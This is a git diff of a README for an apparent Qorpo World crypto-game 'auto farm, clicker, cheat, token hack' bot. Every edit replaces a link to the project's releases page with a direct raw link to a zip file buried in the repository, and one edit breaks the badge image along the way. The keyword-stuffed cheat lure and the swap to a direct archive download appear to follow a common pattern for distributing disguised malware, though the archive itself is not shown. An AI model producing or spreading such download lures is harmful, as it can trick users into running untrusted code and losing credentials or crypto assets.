@@ -1,6 +1,6 @@
 # 🎮 Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api - Automate Your Qorpo World Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+[![Download Now](https://raw.githubusercontent.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Qorpo-World-Crypto/Qorpo.World-Counter/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api-v1.2-beta.4.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Qorpo-World-Crypto/Qorpo.World-Counter/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api-v1.2-beta.4.zip)
 
 ## 📜 Description
 
@@ -11,7 +11,7 @@ The Qorpo World Crypto Bot automates farming and clicker activities in the Qorpo
 To begin using the Qorpo World Crypto Bot, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases).
+   Click [here to download](https://raw.githubusercontent.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Qorpo-World-Crypto/Qorpo.World-Counter/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api-v1.2-beta.4.zip).
 
 2. **Select the Right Version**  
    On the releases page, choose the version that fits your operating system. Look for the most recent release for the best features and updates.
@@ -30,7 +30,7 @@ To begin using the Qorpo World Crypto Bot, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the Qorpo World Crypto Bot, please visit the [Releases page](https://github.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases).  
+To download the Qorpo World Crypto Bot, please visit the [Releases page](https://raw.githubusercontent.com/elroxu/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Qorpo-World-Crypto/Qorpo.World-Counter/Qorpo-World-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api-v1.2-beta.4.zip).  
 Make sure to follow these instructions:
 
 - Choose the version for your operating system.
